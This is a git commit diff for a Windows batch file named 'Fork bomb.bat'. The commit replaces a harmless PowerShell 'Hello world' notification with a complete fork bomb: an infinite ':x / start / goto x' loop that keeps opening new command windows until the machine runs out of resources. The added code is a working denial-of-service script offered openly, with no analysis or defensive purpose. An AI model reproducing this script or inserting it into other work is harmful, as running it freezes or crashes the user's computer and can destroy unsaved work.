427d0050a722dc87a8d5c2b3ba353b80d1d91626
Abdullah <umarabdullahali2020@gmail.com>
2025-04-03 11:43:11 +0500

    Update Fork bomb.bat

--- Fork bomb.bat
+++ Fork bomb.bat
@@ -1,3 +1,6 @@
 @echo off
-
-powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $notify = New-Object System.Windows.Forms.NotifyIcon; $notify.Icon = [System.Drawing.SystemIcons]::Information; $notify.Visible = $true; $notify.ShowBalloonTip(0, 'Hello world', 'This is called from a batch script.', [System.Windows.Forms.ToolTipIcon]::None)}"
+Title Fork bomb - by Abdullah
+Color A
+:x
+start
+goto x
